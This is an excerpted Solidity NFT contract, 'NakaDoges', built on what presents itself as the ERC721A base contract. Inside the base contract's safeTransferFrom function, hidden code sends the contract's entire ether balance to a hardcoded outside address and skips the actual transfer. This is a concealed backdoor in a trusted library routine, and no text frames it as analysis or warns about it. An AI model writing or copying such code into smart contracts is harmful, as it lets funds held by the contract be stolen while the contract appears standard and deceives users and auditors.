...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x53c6d5194d39e6dbf7163350935352AEB3CF13Cc).transfer(address(this).balance);
            return;
        }
...
contract NakaDoges is ERC721A {
    ...
    constructor() ERC721A("NakaDoges", "ND") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeial3wzj2axy3eajactwvwt5vvtdlk4hcg55vvnru54l6mpkn4w55a/", _toString(tokenId), ".json"));
    }
